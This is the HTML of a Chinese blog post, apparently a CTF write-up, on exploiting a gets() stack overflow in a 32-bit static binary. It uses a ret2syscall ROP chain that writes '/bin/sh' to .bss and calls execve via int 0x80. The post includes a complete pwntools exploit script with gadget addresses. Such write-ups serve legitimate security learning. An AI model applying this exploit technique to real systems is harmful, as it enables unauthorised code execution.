@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>32位shellcode(其实是32位syscall) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="查看程序保护NX栈不可执行开启，因此不能使用ret2shellcode了。我们可以考虑一下ret2text或ret2syscall、ret2libc了  ida查看程序打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。 ####程序中&#x2F;bin&#x2F;sh字符。  写题思路题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32位shellcode(其实是32位syscall)">
+<meta property="og:url" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="查看程序保护NX栈不可执行开启，因此不能使用ret2shellcode了。我们可以考虑一下ret2text或ret2syscall、ret2libc了  ida查看程序打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。 ####程序中&#x2F;bin&#x2F;sh字符。  写题思路题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203038.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203450.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613204509.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613210829.png">
+<meta property="article:published_time" content="2023-06-13T12:27:54.000Z">
+<meta property="article:modified_time" content="2023-06-13T13:20:25.584Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203038.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-32位shellcode-其实是32位syscall" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" class="article-date">
+  <time datetime="2023-06-13T12:27:54.000Z" itemprop="datePublished">2023-06-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      32位shellcode(其实是32位syscall)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h2><p>NX栈不可执行开启，因此不能使用ret2shellcode了。<br>我们可以考虑一下ret2text或ret2syscall、ret2libc了</p>
+<p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203038.png" alt="Alt text"></p>
+<h2 id="ida查看程序"><a href="#ida查看程序" class="headerlink" title="ida查看程序"></a>ida查看程序</h2><h4 id="打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！"><a href="#打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！" class="headerlink" title="打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！"></a>打开一看，哇！左边超级多函数，必须来一波ROP执行系统调用！</h4><h4 id="那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。"><a href="#那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。" class="headerlink" title="那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。"></a>那我再看一下，又看到了老朋友gets函数，妥妥的栈溢出。</h4><p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613203450.png" alt="Alt text"></p>
+<p>####程序中/bin/sh字符。</p>
+<p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613204509.png" alt="Alt text"></p>
+<h2 id="写题思路"><a href="#写题思路" class="headerlink" title="写题思路"></a>写题思路</h2><h4 id="题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。"><a href="#题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。" class="headerlink" title="题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。"></a>题目其实已经给的很明确了，开启了NX保护，丢给我们一个炒鸡多函数的静态程序。这就是让我们用ret2syscall。</h4><h4 id="然而程序并没有给我们-bin-sh字符，因此需要我们把-bin-sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。"><a href="#然而程序并没有给我们-bin-sh字符，因此需要我们把-bin-sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。" class="headerlink" title="然而程序并没有给我们/bin/sh字符，因此需要我们把/bin/sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。"></a>然而程序并没有给我们/bin/sh字符，因此需要我们把/bin/sh字符写入一个程序的一个位置，再把那个位置的地址填入对应的ebx寄存器里面即可，而这个位置一般是bss区。</h4><h4 id="那么在这个函数里如何写入-bin-sh呢？我们可以利用程序原有的gets函数来达成此目的。"><a href="#那么在这个函数里如何写入-bin-sh呢？我们可以利用程序原有的gets函数来达成此目的。" class="headerlink" title="那么在这个函数里如何写入/bin/sh呢？我们可以利用程序原有的gets函数来达成此目的。"></a>那么在这个函数里如何写入/bin/sh呢？我们可以利用程序原有的gets函数来达成此目的。</h4><h2 id="ret2syscall的主要原理"><a href="#ret2syscall的主要原理" class="headerlink" title="ret2syscall的主要原理"></a>ret2syscall的主要原理</h2><h4 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h4><p>将rax、rdx、rdi、rsi寄存器分别填入59、0、0、/bin/sh最后在加一个syscall指令的地址，就可以执行系统调用相当于system(/bin/sh)。</p>
+<h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>与64位大致同理，需要寄存器eax、ebx、ecx、edx分别为11、/bin/sh、0、0最后再使用int 0x80指令触发系统调用即可。</p>
+<h2 id="ROP对应的寄存器的gadget"><a href="#ROP对应的寄存器的gadget" class="headerlink" title="ROP对应的寄存器的gadget"></a>ROP对应的寄存器的gadget</h2><p><img src="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/QQ%E6%88%AA%E5%9B%BE20230613210829.png" alt="Alt text"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h4 id="第一次发送payload："><a href="#第一次发送payload：" class="headerlink" title="第一次发送payload："></a>第一次发送payload：</h4><h4 id="通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。"><a href="#通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。" class="headerlink" title="通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。"></a>通过栈溢出把返回地址覆盖为gets函数的地址，从而劫持程序执行流执行gets函数，然后把gets函数的返回地址覆盖为main函数的地址，从而能够进行第二次栈溢出，把gets的参数覆盖为bss区的地址从而把gets函数执行时输入的内容存储在bss区里。</h4><h4 id="第二次发送payload："><a href="#第二次发送payload：" class="headerlink" title="第二次发送payload："></a>第二次发送payload：</h4><h4 id="将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了-bin-sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。"><a href="#将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了-bin-sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。" class="headerlink" title="将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了/bin/sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。"></a>将对应的寄存器填入对应的值和字符串，从而执行系统调用，由于第一次发送payload之后，又发送了/bin/sh并存储在bss区里了，所以我们在只需要把bss区的地址填入ebx寄存器即可。</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./not_&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#shellcode = <span class="title function_">asm</span>(shellcraft.<span class="title function_">sh</span>())</span><br><span class="line">flag_addr = <span class="number">0x80489a4</span></span><br><span class="line">#io.<span class="title function_">recv</span>()</span><br><span class="line">bss_addr = <span class="number">0x80eca00</span></span><br><span class="line">eax_addr = <span class="number">0x8048b0b</span></span><br><span class="line">edx_ecx_ebx_addr = <span class="number">0x806fcf0</span></span><br><span class="line">int_addr = <span class="number">0x806d8a5</span></span><br><span class="line">gets_addr = <span class="number">0x804f8d0</span></span><br><span class="line">main_addr = <span class="number">0x80489E0</span></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">0x2d</span> + <span class="title function_">p32</span>(gets_addr) + <span class="title function_">p32</span>(main_addr) + <span class="title function_">p32</span>(bss_addr)</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b main&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">sendline</span>(b<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">##向gets函数发送字符/bin/sh并存储在对应的bss区里</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">0x2d</span> + <span class="title function_">p32</span>(eax_addr) + <span class="title function_">p32</span>(<span class="number">11</span>) + <span class="title function_">p32</span>(edx_ecx_ebx_addr) + <span class="title function_">p32</span>(<span class="number">0</span>) + <span class="title function_">p32</span>(<span class="number">0</span>) +  <span class="title function_">p32</span>(bss_addr) +  <span class="title function_">p32</span>(int_addr)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" data-id="cliubbu28000048v9dcnja521" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">栈迁移</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E6%94%B9%E5%86%99fini%E4%BD%BF%E7%A8%8B%E5%BA%8F%E5%8F%8D%E5%A4%8D/">32位格式化字符串之改写fini使程序反复</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
